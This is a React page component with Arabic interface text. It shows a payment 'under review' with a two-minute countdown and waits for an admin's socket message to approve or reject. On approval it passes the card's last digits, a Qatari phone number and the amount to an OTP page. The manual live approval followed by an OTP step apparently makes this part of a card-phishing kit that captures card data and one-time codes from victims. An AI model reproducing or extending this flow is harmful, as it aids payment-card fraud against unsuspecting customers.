import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function PaymentPending() {
  const navigate = useNavigate();
  const { socket } = useSocket();
  const [status, setStatus] = useState('pending'); // pending, approved, rejected
  const [message, setMessage] = useState('');
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes in seconds

  // عداد تنازلي
  useEffect(() => {
    if (status !== 'pending') return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // انتهى الوقت - الانتقال لصفحة الفشل
          navigate('/payment-failed');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [status, navigate]);

  // تنسيق الوقت المتبقي
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  useEffect(() => {
    if (!socket) return;

    // استماع لحالة الدفع من الأدمن
    socket.on('paymentStatus', (data) => {
      console.log('💳 Payment status received:', data);
      setStatus(data.status);
      setMessage(data.message || '');

      // إذا تم القبول، الانتقال لصفحة OTP
      if (data.status === 'approved') {
        setTimeout(() => {
          // الحصول على بيانات الدفع من sessionStorage
          const paymentData = JSON.parse(sessionStorage.getItem('pendingPayment') || '{}');
          
          navigate('/payment-otp', {
            state: {
              cardLastDigits: paymentData.cardLastDigits || '****',
              phoneNumber: paymentData.phoneNumber || '+974 ****',
              amount: paymentData.amount || '0.00'
            }
          });
        }, 2000);
      }

      // إذا تم الرفض، الانتقال لصفحة الفشل بعد 2 ثانية
      if (data.status === 'rejected') {
        setTimeout(() => {
          navigate('/payment-failed');
        }, 2000);
      }
    });

    return () => {
      socket.off('paymentStatus');
    };
  }, [socket, navigate]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        {/* أيقونة الحالة */}
        <div className="mb-6">
          {status === 'pending' && (
            <div className="relative mx-auto w-24 h-24">
              <div className="absolute inset-0 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <svg className="w-12 h-12 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
            </div>
          )}
          
          {status === 'approved' && (
            <div className="mx-auto w-24 h-24 bg-green-100 rounded-full flex items-center justify-center">
              <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          )}
          
          {status === 'rejected' && (
            <div className="mx-auto w-24 h-24 bg-red-100 rounded-full flex items-center justify-center">
              <svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
          )}
        </div>

        {/* العنوان والرسالة */}
        <div className="mb-6">
          {status === 'pending' && (
            <>
              <h1 className="text-2xl font-bold text-gray-800 mb-2">
                جاري معالجة الدفع
              </h1>
              <p className="text-gray-600">
                يرجى الانتظار بينما نقوم بمراجعة طلب الدفع الخاص بك
              </p>
            </>
          )}
          
          {status === 'approved' && (
            <>
              <h1 className="text-2xl font-bold text-green-600 mb-2">
                تم قبول الدفع! ✓
              </h1>
              <p className="text-gray-600">
                {message || 'تم قبول عملية الدفع بنجاح'}
              </p>
            </>
          )}
          
          {status === 'rejected' && (
            <>
              <h1 className="text-2xl font-bold text-red-600 mb-2">
                تم رفض الدفع ✗
              </h1>
              <p className="text-gray-600">
                {message || 'عذراً، تم رفض عملية الدفع'}
              </p>
            </>
          )}
        </div>

        {/* معلومات إضافية */}
        {status === 'pending' && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-sm text-gray-700">
            <div className="flex items-center justify-center gap-2 mb-3">
              <svg className="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <span className="text-2xl font-bold text-blue-600">{formatTime(timeLeft)}</span>
            </div>
            <div className="w-full bg-blue-200 rounded-full h-2 mb-3">
              <div 
                className="bg-blue-600 h-2 rounded-full transition-all duration-1000"
                style={{ width: `${(timeLeft / 120) * 100}%` }}
              ></div>
            </div>
            <p className="text-xs text-gray-600">
              ⏱️ سيتم إلغاء الطلب تلقائياً بعد انتهاء الوقت
            </p>
          </div>
        )}

        {/* أزرار الإجراءات */}
        {status === 'rejected' && (
          <div className="mt-6 space-y-3">
            <button
              onClick={() => navigate('/paydcc')}
              className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors"
            >
              إعادة المحاولة
            </button>
            <button
              onClick={() => navigate('/')}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
            >
              العودة للرئيسية
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
